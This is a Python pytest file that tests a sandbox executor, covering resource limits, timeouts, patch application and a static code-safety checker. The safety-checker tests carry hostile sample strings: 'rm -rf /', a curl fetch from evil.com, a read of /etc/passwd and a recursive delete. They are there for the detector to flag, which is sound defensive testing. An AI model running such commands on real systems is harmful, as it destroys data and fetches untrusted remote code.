"""
Tests for the sandbox execution system.

Tests safe code execution with resource limits and isolation.
"""

import pytest
import tempfile
import time
from pathlib import Path
from typing import List

from tailchasing.sandbox.executor import (
    SandboxRunner, SandboxSuccess, SandboxFailure, SandboxTimeout,
    ResourceLimits, ErrorType, create_sandbox_runner, is_safe_to_execute
)
from tailchasing.engine.convergence import PatchInfo
from tailchasing.core.issues import Issue


@pytest.fixture
def temp_workspace():
    """Create temporary workspace for testing."""
    with tempfile.TemporaryDirectory() as temp_dir:
        workspace = Path(temp_dir)
        
        # Create test files
        (workspace / "test.py").write_text("""
def add(a, b):
    return a + b

def test_add():
    assert add(2, 3) == 5
    assert add(-1, 1) == 0
    print("All tests passed!")

if __name__ == "__main__":
    test_add()
""")
        
        (workspace / "broken.py").write_text("""
def broken_function(:
    # Invalid syntax
    return "broken"
""")
        
        (workspace / "memory_hog.py").write_text("""
def memory_hog():
    # Try to allocate large amount of memory rapidly
    data = []
    try:
        while True:
            # Allocate 10MB chunks quickly
            data.append("x" * (10 * 1024 * 1024))
    except MemoryError:
        print(f"MemoryError after {len(data)} allocations")
        return len(data)

if __name__ == "__main__":
    result = memory_hog()
    print(f"Allocated {result} chunks")
""")
        
        (workspace / "infinite_loop.py").write_text("""
def infinite_loop():
    while True:
        pass

if __name__ == "__main__":
    infinite_loop()
""")
        
        yield workspace


@pytest.fixture
def sandbox_runner():
    """Create sandbox runner for testing."""
    limits = ResourceLimits(
        memory_mb=128,  # Lower limits for testing
        cpu_time_seconds=5,
        wall_time_seconds=10,
        max_file_descriptors=64
    )
    return SandboxRunner(limits)


class TestSandboxRunner:
    """Test the SandboxRunner class."""
    
    def test_successful_execution(self, sandbox_runner, temp_workspace):
        """Test successful code execution in sandbox."""
        patches = [
            PatchInfo(
                file_path="test.py",
                original_content="# original",
                patched_content=(temp_workspace / "test.py").read_text(),
                description="Add test function",
                issues_addressed=[]
            )
        ]
        
        result = sandbox_runner.execute_with_patches(
            temp_workspace,
            patches,
            "python test.py"
        )
        
        assert isinstance(result, SandboxSuccess)
        assert result.is_success()
        assert "All tests passed!" in result.stdout
        assert result.metrics.return_code == 0
        assert result.elapsed_time > 0
        assert result.sandbox_path is not None
    
    def test_syntax_error_handling(self, sandbox_runner, temp_workspace):
        """Test handling of syntax errors."""
        patches = [
            PatchInfo(
                file_path="broken.py",
                original_content="# original",
                patched_content=(temp_workspace / "broken.py").read_text(),
                description="Add broken syntax",
                issues_addressed=[]
            )
        ]
        
        result = sandbox_runner.execute_with_patches(
            temp_workspace,
            patches,
            "python broken.py"
        )
        
        assert isinstance(result, SandboxFailure)
        assert not result.is_success()
        assert result.error_type == ErrorType.SYNTAX_ERROR
        assert "SyntaxError" in result.traceback_str
        assert result.metrics.return_code != 0
    
    def test_timeout_handling(self, sandbox_runner, temp_workspace):
        """Test timeout handling for infinite loops."""
        patches = [
            PatchInfo(
                file_path="infinite_loop.py", 
                original_content="# original",
                patched_content=(temp_workspace / "infinite_loop.py").read_text(),
                description="Add infinite loop",
                issues_addressed=[]
            )
        ]
        
        result = sandbox_runner.execute_with_patches(
            temp_workspace,
            patches,
            "python infinite_loop.py"
        )
        
        # Should timeout or be killed by resource monitor
        assert not result.is_success()
        assert isinstance(result, (SandboxTimeout, SandboxFailure))
        
        # If killed by process monitor, shows up as runtime failure with -15 exit code
        if isinstance(result, SandboxFailure):
            assert result.error_type == ErrorType.RUNTIME_ERROR
            assert result.metrics.return_code == -15  # SIGTERM
        else:
            assert result.timeout_type == "wall"
            assert result.killed_at > 0
    
    def test_memory_limit_enforcement(self, temp_workspace):
        """Test memory limit enforcement."""
        # Very low memory limit for testing
        limits = ResourceLimits(memory_mb=16, cpu_time_seconds=10, wall_time_seconds=15)
        runner = SandboxRunner(limits)
        
        patches = [
            PatchInfo(
                file_path="memory_hog.py",
                original_content="# original", 
                patched_content=(temp_workspace / "memory_hog.py").read_text(),
                description="Add memory-intensive code",
                issues_addressed=[]
            )
        ]
        
        result = runner.execute_with_patches(
            temp_workspace,
            patches,
            "python memory_hog.py"
        )
        
        # Memory-intensive code should either succeed with MemoryError handling
        # or be killed by the process monitor for exceeding memory limits
        if result.is_success():
            # Code handled MemoryError gracefully
            assert isinstance(result, SandboxSuccess)
            assert "MemoryError" in result.stdout or "Allocated" in result.stdout
        else:
            # Killed by process monitor or failed otherwise
            assert isinstance(result, (SandboxTimeout, SandboxFailure))
            if isinstance(result, SandboxFailure):
                # Could be killed by monitor (-15) or other memory-related error
                assert result.error_type in [ErrorType.RUNTIME_ERROR, ErrorType.MEMORY_LIMIT]
    
    def test_code_snippet_execution(self, sandbox_runner):
        """Test execution of code snippets."""
        code = """
def factorial(n):
    if n <= 1:
        return 1
    return n * factorial(n - 1)

result = factorial(5)
print(f"Factorial of 5 is {result}")
"""
        
        result = sandbox_runner.execute_code_snippet(code)
        
        assert isinstance(result, SandboxSuccess)
        assert result.is_success()
        assert "Factorial of 5 is 120" in result.stdout
    
    def test_code_snippet_with_test(self, sandbox_runner):
        """Test code snippet execution with separate test code."""
        code = """
def is_prime(n):
    if n < 2:
        return False
    for i in range(2, int(n ** 0.5) + 1):
        if n % i == 0:
            return False
    return True
"""
        
        test_code = """
import sys
sys.path.append('.')
from code import is_prime

assert is_prime(2) == True
assert is_prime(3) == True
assert is_prime(4) == False
assert is_prime(17) == True
assert is_prime(25) == False

print("All prime tests passed!")
"""
        
        result = sandbox_runner.execute_code_snippet(code, test_code)
        
        assert isinstance(result, SandboxSuccess)
        assert result.is_success()
        assert "All prime tests passed!" in result.stdout
    
    def test_multiple_patches_application(self, sandbox_runner, temp_workspace):
        """Test application of multiple patches."""
        # Create additional files
        (temp_workspace / "module1.py").write_text("def func1(): return 'original1'")
        (temp_workspace / "module2.py").write_text("def func2(): return 'original2'")
        
        patches = [
            PatchInfo(
                file_path="module1.py",
                original_content="def func1(): return 'original1'",
                patched_content="def func1(): return 'patched1'",
                description="Patch module1",
                issues_addressed=[]
            ),
            PatchInfo(
                file_path="module2.py", 
                original_content="def func2(): return 'original2'",
                patched_content="def func2(): return 'patched2'",
                description="Patch module2",
                issues_addressed=[]
            ),
            PatchInfo(
                file_path="main.py",
                original_content="",
                patched_content="""
from module1 import func1
from module2 import func2

print(f"Module1: {func1()}")
print(f"Module2: {func2()}")
""",
                description="Add main module",
                issues_addressed=[]
            )
        ]
        
        result = sandbox_runner.execute_with_patches(
            temp_workspace,
            patches,
            "python main.py"
        )
        
        assert isinstance(result, SandboxSuccess)
        assert result.is_success()
        assert "Module1: patched1" in result.stdout
        assert "Module2: patched2" in result.stdout
    
    def test_context_manager_cleanup(self, temp_workspace):
        """Test that context manager properly cleans up."""
        patches = [
            PatchInfo(
                file_path="test.py",
                original_content="# original",
                patched_content="print('Hello, World!')",
                description="Simple test",
                issues_addressed=[]
            )
        ]
        
        with create_sandbox_runner() as runner:
            result = runner.execute_with_patches(
                temp_workspace,
                patches,
                "python test.py"
            )
            
            assert isinstance(result, SandboxSuccess)
            assert result.is_success()
            assert "Hello, World!" in result.stdout
            # During execution, sandbox is already cleaned up by execute_with_patches
        
        # Context manager cleanup ensures no active sandboxes remain
        assert len(runner._active_sandboxes) == 0
    
    def test_resource_metrics_collection(self, sandbox_runner, temp_workspace):
        """Test that resource metrics are collected."""
        patches = [
            PatchInfo(
                file_path="cpu_intensive.py",
                original_content="",
                patched_content="""
import time
import math

# CPU-intensive calculation
result = 0
for i in range(100000):
    result += math.sqrt(i)

print(f"Result: {result}")
time.sleep(0.1)  # Small delay to measure wall time
""",
                description="CPU intensive task",
                issues_addressed=[]
            )
        ]
        
        result = sandbox_runner.execute_with_patches(
            temp_workspace,
            patches,
            "python cpu_intensive.py"
        )
        
        assert isinstance(result, SandboxSuccess)
        assert result.metrics.cpu_time_seconds > 0
        assert result.metrics.wall_time_seconds > 0
        assert result.metrics.peak_memory_mb > 0
    
    def test_output_file_collection(self, sandbox_runner, temp_workspace):
        """Test collection of output files."""
        patches = [
            PatchInfo(
                file_path="file_writer.py",
                original_content="",
                patched_content="""
# Write various output files
with open("output.log", "w") as f:
    f.write("This is a log file\\n")

with open("results.json", "w") as f:
    f.write('{"status": "success", "value": 42}\\n')

with open("report.txt", "w") as f:
    f.write("Test completed successfully\\n")

print("Files written successfully")
""",
                description="Write output files",
                issues_addressed=[]
            )
        ]
        
        result = sandbox_runner.execute_with_patches(
            temp_workspace,
            patches,
            "python file_writer.py"
        )
        
        assert isinstance(result, SandboxSuccess)
        assert len(result.output_files) >= 3
        assert "output.log" in result.output_files
        assert "results.json" in result.output_files
        assert "report.txt" in result.output_files
        assert "This is a log file" in result.output_files["output.log"]
        assert '"status": "success"' in result.output_files["results.json"]


class TestResourceLimits:
    """Test resource limits configuration."""
    
    def test_default_limits(self):
        """Test default resource limits."""
        limits = ResourceLimits()
        assert limits.memory_mb == 512
        assert limits.cpu_time_seconds == 45
        assert limits.wall_time_seconds == 60
        assert limits.max_file_descriptors == 256
        assert limits.disable_network is True
    
    def test_custom_limits(self):
        """Test custom resource limits."""
        limits = ResourceLimits(
            memory_mb=1024,
            cpu_time_seconds=30,
            disable_network=False
        )
        
        assert limits.memory_mb == 1024
        assert limits.cpu_time_seconds == 30
        assert limits.disable_network is False
        # Defaults should still apply
        assert limits.max_file_descriptors == 256


class TestUtilityFunctions:
    """Test utility functions."""
    
    def test_create_sandbox_runner(self):
        """Test sandbox runner factory function."""
        runner = create_sandbox_runner(memory_mb=256, timeout_seconds=30)
        
        assert runner.limits.memory_mb == 256
        assert runner.limits.cpu_time_seconds == 30
        assert runner.limits.wall_time_seconds == 45  # timeout + 15
        assert runner.limits.disable_network is True
    
    def test_is_safe_to_execute_safe_code(self):
        """Test safety check for safe code."""
        safe_code = """
def fibonacci(n):
    if n <= 1:
        return n
    return fibonacci(n-1) + fibonacci(n-2)

print(fibonacci(10))
"""
        
        is_safe, warnings = is_safe_to_execute(safe_code)
        assert is_safe is True
        assert len(warnings) == 0
    
    def test_is_safe_to_execute_dangerous_code(self):
        """Test safety check for dangerous code."""
        dangerous_code = """
import subprocess
import os

subprocess.call("rm -rf /", shell=True)
os.system("curl http://evil.com/malware")
"""
        
        is_safe, warnings = is_safe_to_execute(dangerous_code)
        assert is_safe is False
        assert len(warnings) > 0
        assert any("subprocess" in warning for warning in warnings)
    
    def test_is_safe_to_execute_file_operations(self):
        """Test safety check for file operations."""
        file_code = """
with open("/etc/passwd", "r") as f:
    data = f.read()

import shutil
shutil.rmtree("/important/directory")
"""
        
        is_safe, warnings = is_safe_to_execute(file_code)
        # File operations are flagged but not necessarily unsafe
        assert len(warnings) > 0
        assert any("open(" in warning for warning in warnings)
        assert any("shutil." in warning for warning in warnings)


class TestErrorHandling:
    """Test error handling and edge cases."""
    
    def test_nonexistent_source_directory(self):
        """Test handling of non-existent source directory."""
        runner = create_sandbox_runner()
        
        result = runner.execute_with_patches(
            Path("/nonexistent/path"),
            [],
            "python test.py"
        )
        
        assert isinstance(result, SandboxFailure)
        assert result.error_type == ErrorType.SETUP_ERROR
        assert not result.is_success()
    
    def test_invalid_command(self, sandbox_runner, temp_workspace):
        """Test handling of invalid commands."""
        patches = [
            PatchInfo(
                file_path="test.py",
                original_content="",
                patched_content="print('test')",
                description="Simple test",
                issues_addressed=[]
            )
        ]
        
        result = sandbox_runner.execute_with_patches(
            temp_workspace,
            patches,
            "nonexistent_command"
        )
        
        assert isinstance(result, SandboxFailure)
        assert not result.is_success()
        assert result.error_type == ErrorType.RUNTIME_ERROR
    
    def test_patch_application_failure(self, sandbox_runner, temp_workspace):
        """Test handling of patch application failures."""
        # Patch with invalid file path
        patches = [
            PatchInfo(
                file_path="deeply/nested/invalid/path.py",
                original_content="",
                patched_content="print('test')",
                description="Invalid path patch",
                issues_addressed=[]
            )
        ]
        
        result = sandbox_runner.execute_with_patches(
            temp_workspace,
            patches,
            "python test.py"
        )
        
        # Should succeed in creating the nested path
        assert isinstance(result, (SandboxSuccess, SandboxFailure))
        if isinstance(result, SandboxFailure):
            # If it fails, should be due to command execution, not patch application
            assert result.error_type != ErrorType.IO_ERROR


@pytest.mark.integration
def test_integration_with_convergence_system(temp_workspace):
    """Integration test with convergence system components."""
    # This test demonstrates how sandbox would be used with the convergence system
    
    runner = create_sandbox_runner()
    
    # Simulate a fix from the convergence system
    patches = [
        PatchInfo(
            file_path="calculator.py",
            original_content="def add(a, b): pass",
            patched_content="""
def add(a, b):
    return a + b

def multiply(a, b):
    return a * b

def test_calculator():
    assert add(2, 3) == 5
    assert multiply(4, 5) == 20
    print("Calculator tests passed!")

if __name__ == "__main__":
    test_calculator()
""",
            description="Implement calculator functions",
            issues_addressed=[
                Issue(kind="phantom_function", message="Empty add function", severity=2)
            ]
        )
    ]
    
    result = runner.execute_with_patches(
        temp_workspace,
        patches,
        "python calculator.py"
    )
    
    assert isinstance(result, SandboxSuccess)
    assert result.is_success()
    assert "Calculator tests passed!" in result.stdout
    assert result.metrics.return_code == 0
    
    # Verify metrics are collected for convergence analysis
    assert result.metrics.cpu_time_seconds >= 0
    assert result.metrics.wall_time_seconds > 0
    assert result.metrics.peak_memory_mb > 0